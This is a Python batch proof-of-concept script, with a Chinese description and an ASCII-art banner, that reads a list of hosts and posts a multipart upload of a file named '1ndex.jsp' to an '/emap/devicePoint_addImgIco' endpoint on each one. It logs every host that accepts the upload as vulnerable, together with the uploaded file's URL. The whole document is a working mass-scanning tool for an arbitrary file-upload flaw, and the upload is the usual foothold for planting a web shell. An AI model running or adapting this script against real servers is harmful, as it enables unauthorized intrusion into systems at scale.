import argparse
import time
import requests
parser = argparse.ArgumentParser(description='批量poc')
parser.add_argument('-f',help='Batch detection file name',type=str)
args = parser.parse_args()
file = args.f

def banner():
    test = """
    ______     .---.  .---.  ____..--'.---.  .---.   ____     __   ,-----.                  .--.      .--.     .-./`)    .-'''-.     _______    
|    _ `''. |   |  |_ _| |        ||   |  |_ _|   \   \   /  /.'  .-,  '.                |  |_     |  |     \ '_ .') / _     \   /   __  \   
| _ | ) _  \|   |  ( ' ) |   .-'  '|   |  ( ' )    \  _. /  '/ ,-.|  \ _ \               | _( )_   |  |    (_ (_) _)(`' )/`--'  | ,_/  \__)  
|( ''_'  ) ||   '-(_{;}_)|.-'.'   /|   '-(_{;}_)    _( )_ .';  \  '_ /  | :  _ _    _ _  |(_ o _)  |  |      / .  \(_ o _).   ,-./  )        
| . (_) `. ||      (_,_)    /   _/ |      (_,_) ___(_ o _)' |  _`,/ \ _/  | ( ' )--( ' ) | (_,_) \ |  | ___  |-'`|  (_,_). '. \  '_ '`)      
|(_    ._) '| _ _--.   |  .'._( )_ | _ _--.   ||   |(_,_)'  : (  '\_/ \   ;(_{;}_)(_{;}_)|  |/    \|  ||   | |   ' .---.  \  : > (_)  )  __  
|  (_.\.' / |( ' ) |   |.'  (_'o._)|( ' ) |   ||   `-'  /    \ `"/  \  )  \ (_,_)--(_,_) |  '  /\  `  ||   `-'  /  \    `-'  |(  .  .-'_/  ) 
|       .'  (_{;}_)|   ||    (_,_)|(_{;}_)|   | \      /      '. \_/``"/)  )             |    /  \    | \      /    \       /  `-'`-'     /  
'-----'`    '(_,_) '---'|_________|'(_,_) '---'  `-..-'         '-----' `-'              `---'    `---`  `-..-'      `-...-'     `._____.'                                  
                                                            @author: lgj        
    """
    print(test)

def get_url(file):
    with open('{}'.format(file),'r',encoding='utf-8') as f:
        for i in f:
            i = i.replace('\n', '')
            send_req("http://"+i)
def write_result(content):
    f = open("result.txt", "a", encoding="UTF-8")
    f.write('{}\n'.format(content))
    f.close()
def send_req(url_check):
    print('{} runing Check'.format(url_check))
    url = url_check + '/emap/devicePoint_addImgIco?hasSubsystem=true'
    header = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Content-Type':'multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT',
        'Accept':'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection':'close'
    }
    data = (
        "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\n"
        'Content-Disposition: form-data; name="upload"; filename="1ndex.jsp"\r\n'
        "Content-Type: application/octet-stream\r\n"
        "Content-Transfer-Encoding: binary\r\n"
        "\r\n"
        "456\r\n"
        "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--"
    )
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=url,headers=header,data=data,verify=False,timeout=3).json()
        if response['code'] == 1:
            result = '{} 存在漏洞 ：{} \n'.format(url_check,
            url_check + "/upload/emap/society_new/" + response['data'])
            print(result)
            write_result(result)
        time.sleep(1)
    except Exception as e:
        print(e)
        pass
if __name__ == '__main__':
    if file is None:
        print('文件批量检测')
    else:
        get_url(file)
